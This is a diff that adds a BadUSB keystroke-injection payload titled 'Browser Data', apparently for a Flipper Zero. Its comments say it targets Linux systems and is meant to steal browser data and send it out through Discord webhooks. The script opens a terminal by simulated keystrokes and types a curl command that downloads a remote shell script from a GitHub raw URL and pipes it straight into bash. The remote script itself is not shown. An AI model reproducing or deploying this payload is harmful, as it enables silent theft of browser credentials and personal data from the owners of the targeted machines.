@@ -1,0 +1,17 @@
+REM     Title: Browser Data
+
+REM     Author: MagikarpLv13
+
+REM     Description: This payload is meant to steal Browser Data and send ii using discord webhooks
+
+REM     Target: Maximum Linux distributions
+
+GUI
+DELAY 500
+STRING terminal
+DELAY 200
+DOWN
+ENTER
+DELAY 500
+STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
+ENTER
